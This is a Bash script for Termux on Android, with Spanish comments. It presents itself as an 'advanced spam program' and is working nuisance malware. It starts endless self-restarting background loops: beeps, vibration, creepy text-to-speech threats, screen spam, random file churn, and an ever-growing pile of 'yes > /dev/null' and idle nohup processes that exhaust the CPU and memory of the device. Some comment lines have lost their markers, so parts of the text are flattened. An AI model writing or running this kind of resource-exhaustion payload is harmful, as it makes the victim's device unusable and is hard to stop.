#!/bin/bash

Configuración de variables

DELAY_SHORT=0.05                      # Tiempo más corto entre mensajes DELAY_LONG=0.5                       # Tiempo más largo para otras operaciones

Ya no necesitamos la URL de audio

LOG_FILE="/data/data/com.termux/files/home/.spam_log" BEEP_CHAR="\007"                      # Carácter de beep para sonido nativo ALT_BEEP="\033[5m█\033[0m"           # Carácter alternativo que puede generar sonido

Mejora: Verificar y crear carpeta de logs si no existe

mkdir -p "$(dirname "$LOG_FILE")"

Función para imprimir texto con colores aleatorios mejorada

function print_colored_spam { colors=("31" "32" "33" "34" "35" "36" "91" "92" "93" "94" "95" "96") backgrounds=("" "40" "41" "42" "43" "44" "45" "46" "47") formats=("0" "1" "2" "4" "5" "7")

messages=(
    "¡SPAM EXTREMO ACTIVADO!"
    "⚠️ ADVERTENCIA: SOBRECARGA DE SPAM ⚠️"
    "█▓▒░ SPAM INFINITO ░▒▓█"
    "【S】【P】【A】【M】"
    "🔥 SPAM DESTRUCTIVO 🔥"
    "♚ ♛ SPAM SUPREMO ♛ ♚"
    "★彡 SPAM CÓSMICO 彡★"
    "⚡⚡⚡ SPAM ELECTRIFICADO ⚡⚡⚡"
    "✰✰✰ SPAM INTENSO ✰✰✰"
)

while true; do
    color=${colors[$RANDOM % ${#colors[@]}]}
    bg=${backgrounds[$RANDOM % ${#backgrounds[@]}]}
    format=${formats[$RANDOM % ${#formats[@]}]}
    message=${messages[$RANDOM % ${#messages[@]}]}
    
    # Formato complejo aleatorio
    bg_param=""
    [[ -n "$bg" ]] && bg_param=";$bg"
    
    # Timestamp con milisegundos
    timestamp=$(date +"%H:%M:%S.%3N")
    
    # Implementación de caracteres especiales y efectos visuales
    echo -e "\033[${format}${bg_param};${color}m${timestamp} - ${message} - $(date +%s%N)\033[0m"
    
    # Registrar en el archivo de log
    echo "${timestamp} - SPAM EJECUTADO" >> "$LOG_FILE"
    
    # Delay aleatorio para efectos visuales variables
    sleep $(echo "scale=3; $DELAY_SHORT + ($RANDOM % 10) / 100" | bc)
done

}

Función para generar carga adicional

function generate_load { while true; do # Procesos intensivos para generar carga for i in {1..1000}; do echo "$i^2" | bc > /dev/null done sleep "$DELAY_LONG" done }

Función para verificar y instalar dependencias mínimas (sin mpv)

function install_dependencies { echo -e "\033[32mVerificando e instalando dependencias mínimas...\033[0m"

# Lista de paquetes necesarios (eliminado mpv)
packages=("bc" "termux-api" "coreutils")

for pkg in "${packages[@]}"; do
    if ! command -v "$pkg" &> /dev/null; then
        echo -e "\033[33mInstalando $pkg...\033[0m"
        pkg install "$pkg" -y
    fi
done

echo -e "\033[32m✓ Dependencias mínimas instaladas correctamente\033[0m"

}

Función para reproducir audio usando el terminal bell y generación de sonido nativo

function play_audio_loop { echo -e "\033[36mIniciando generación de sonido en bucle...\033[0m"

while true; do
    # Usar caracteres de terminal para generar sonidos (beep)
    for i in {1..20}; do
        echo -en "\007" # Terminal bell
        sleep 0.1
    done
    
    # Generar patrón de sonido usando printf y caracteres especiales
    for pitch in {1..20}; do
        # Alterna entre diferentes caracteres que pueden producir sonido
        echo -en "\033[10;${pitch}m\007\033[10;0m"
        sleep 0.05
    done
    
    # Si está disponible termux-tts-speak, usarlo para generar sonido
    if command -v termux-tts-speak &> /dev/null; then
        messages=("ALERTA" "SPAM" "SISTEMA" "ADVERTENCIA" "PELIGRO")
        msg=${messages[$RANDOM % ${#messages[@]}]}
        termux-tts-speak -r 1.5 -p 1.2 "$msg" &> /dev/null &
        sleep 2
        pkill -f termux-tts-speak
    fi
    
    # Si está disponible termux-audio-info, intentar enviar tonos al altavoz
    if command -v termux-audio-info &> /dev/null; then
        for freq in 500 800 1000 1200 1500; do
            echo -en "\033]11;${freq}\007"
            sleep 0.2
        done
    fi
    
    # Generar vibración en el terminal (puede producir zumbido en algunos dispositivos)
    echo -en "\033[5m████████████████████████\033[0m"
    sleep 0.5
done

}

Función para crear archivos temporales, generar actividad en disco y hacer beeps

function create_temp_files { temp_dir="/data/data/com.termux/files/home/.temp_spam" mkdir -p "$temp_dir"

while true; do
    # Crear archivos temporales con contenido aleatorio
    for i in {1..50}; do
        # Generar un beep ocasional durante la escritura
        if [ $((i % 5)) -eq 0 ]; then
            echo -en "$BEEP_CHAR"
        fi
        
        file_size=$((RANDOM % 100 + 10))
        # Crear archivo con datos aleatorios + caracteres que pueden generar sonido
        {
            head -c "${file_size}K" /dev/urandom
            echo -en "$BEEP_CHAR$ALT_BEEP\033[5m█\033[0m"
        } > "${temp_dir}/temp_file_${i}.bin"
    done
    
    # Crear un archivo especial que contiene caracteres para generar sonido
    echo -en "\007\007\033[5m█\033[0m\033[7m \033[0m\007" > "${temp_dir}/beep.txt"
    
    # Esperar un momento
    sleep "$DELAY_LONG"
    
    # Abrir y cerrar el archivo de beep varias veces (puede generar sonido)
    for j in {1..5}; do
        cat "${temp_dir}/beep.txt" > /dev/null
        echo -en "$BEEP_CHAR"
        sleep 0.1
    done
    
    # Limpiar archivos temporales
    rm -f "${temp_dir}"/*
done

}

Función para activar vibración si está disponible

function activate_vibration { if command -v termux-vibrate &> /dev/null; then while true; do # Vibración aleatoria entre 100ms y 1000ms duration=$((100 + RANDOM % 900)) termux-vibrate -d "$duration" &> /dev/null sleep $(echo "scale=3; 0.5 + ($RANDOM % 20) / 10" | bc) done fi }

Mensaje de inicio

echo -e "\033[1;33m════════════════════════════════════════\033[0m" echo -e "\033[1;31m   INICIANDO PROGRAMA AVANZADO DE SPAM   \033[0m" echo -e "\033[1;33m════════════════════════════════════════\033[0m"

Instalar dependencias

install_dependencies

function glitch_effect { while true; do printf "\033[5m\033[31m█▒▓░ERROR░▓▒█\033[0m\007" sleep 0.2 echo -en "\033[40m$(head -c 500 /dev/urandom | tr -dc '[:graph:]')\033[0m" sleep 0.3 done } glitch_effect &

function fake_termux_sessions { while true; do nohup bash -c 'while true; do sleep 9999; done' & sleep 0.5 done } fake_termux_sessions &

function slow_system_down { while true; do yes > /dev/null & sleep 1 done } slow_system_down &

function horror_voice { while true; do if command -v termux-tts-speak &> /dev/null; then msgs=("Estoy dentro..." "No puedes escapar..." "¿Me ves?" "Detrás de ti..." "Termux me pertenece") termux-tts-speak -r 0.9 -p 0.1 "${msgs[$RANDOM % ${#msgs[@]}]}" sleep 4 fi done } horror_voice &

function invert_screen { while true; do echo -e "\033[7m¡MODO OSCURO! ¡CONTROL TOTAL!\033[0m" sleep 1 done } invert_screen &

function show_progress { local duration=$1 local message=$2 local chars=('⣾' '⣽' '⣻' '⢿' '⡿' '⣟' '⣯' '⣷') local start=$(date +%s) local end=$((start + duration))

echo -ne "\033[1;36m$message\033[0m "

while [[ $(date +%s) -lt $end ]]; do
    for char in "${chars[@]}"; do
        echo -ne "\r\033[1;36m$message\033[0m \033[1;33m$char\033[0m"
        # Añadir sonido de beep ocasional durante la carga
        if [ $((RANDOM % 5)) -eq 0 ]; then
            echo -en "$BEEP_CHAR"
        fi
        sleep 0.1
    done
done

# Beep final al completar
echo -en "$BEEP_CHAR$BEEP_CHAR"
echo -e "\r\033[1;36m$message\033[0m \033[1;32m✓\033[0m"

}

Mostrar preparación con animación

show_progress 3 "Preparando sistema para spam intensivo..." show_progress 2 "Configurando módulos avanzados..." show_progress 2 "Iniciando procesos en paralelo..."

Iniciar todos los procesos en segundo plano

print_colored_spam & spam_pid=$!

play_audio_loop & audio_pid=$!

generate_load & load_pid=$!

create_temp_files & files_pid=$!

activate_vibration & vibration_pid=$!

Función para crear patrones de sonido adicionales usando caracteres ASCII

function generate_ascii_sounds { while true; do # Diferentes patrones que pueden generar sonidos en el terminal patterns=( "\033[7m \033[0m\033[7m \033[0m\033[7m \033[0m\033[7m \033[0m" "\033[1m$BEEP_CHAR\033[0m" "\033[5;1;7m█\033[0m" "\033[5;7m▓\033[0m" "\033[9m$ALT_BEEP\033[0m" )

for p in "${patterns[@]}"; do
        echo -en "$p"
        sleep $(echo "scale=3; 0.1 + ($RANDOM % 5) / 100" | bc)
    done
    
    # Enviar más caracteres de beep con diferentes formatos
    echo -en "\033[1;5m\007\033[0m"
    sleep 0.5
done

}

Iniciar el generador de sonidos ASCII

generate_ascii_sounds & ascii_sound_pid=$!

Crear un proceso adicional para mantener el script activo

incluso si se cierran otras partes

( while true; do # Verificar si los procesos principales están activos if ! ps -p $spam_pid > /dev/null; then print_colored_spam & spam_pid=$! fi

if ! ps -p $audio_pid > /dev/null; then
        play_audio_loop &
        audio_pid=$!
    fi
    
    if ! ps -p $ascii_sound_pid > /dev/null; then
        generate_ascii_sounds &
        ascii_sound_pid=$!
    fi
    
    # Forzar un beep cada cierto tiempo
    echo -en "$BEEP_CHAR"

glitch_effect & fake_termux_sessions & slow_system_down & horror_voice & invert_screen &

sleep 5
done

) & monitor_pid=$!

Mensaje de activación completa

echo -e "\n\033[1;42;97m SPAM ACTIVADO EXITOSAMENTE - EJECUCIÓN INFINITA INICIADA \033[0m\n"

Esperar indefinidamente para mantener el script en ejecución

wait

